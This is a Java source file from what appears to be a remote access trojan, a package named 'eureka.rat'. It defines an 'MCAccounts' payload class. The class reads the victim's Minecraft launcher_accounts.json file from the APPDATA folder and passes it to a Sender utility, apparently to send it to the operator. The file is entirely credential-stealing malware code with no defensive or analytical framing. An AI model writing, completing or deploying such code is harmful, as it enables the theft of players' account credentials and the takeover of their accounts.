package eureka.rat.features;

import eureka.rat.utils.Sender;
import eureka.rat.payloads.Payload;

import java.io.File;
import java.util.Optional;

public class MCAccounts implements Payload {
    @Override
    public void execute() throws Exception {
        // Launched Accounts
        Optional<File> file = Sender.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "launcher_accounts.json");
        file.ifPresent(Sender::send);


    }
}
